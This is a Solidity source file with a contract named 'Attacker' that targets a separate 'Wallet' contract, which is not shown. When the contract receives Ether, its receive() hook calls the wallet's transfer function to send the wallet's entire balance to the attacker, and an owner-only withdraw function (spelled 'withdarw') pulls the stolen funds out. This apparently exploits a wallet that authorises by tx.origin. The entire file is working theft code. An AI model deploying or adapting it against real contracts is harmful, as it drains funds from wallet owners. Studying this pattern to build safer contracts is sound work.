// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract Attacker {
    address payable public owner;
    Wallet targetContract;

    constructor(Wallet _targetContract) {
        targetContract = Wallet(_targetContract);
        owner = payable(msg.sender);
    }

    function attack() public {
        targetContract.transfer(owner, address(targetContract).balance);
    }

    function withdarw() public {
        require (owner == msg.sender);
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        attack();
    }
}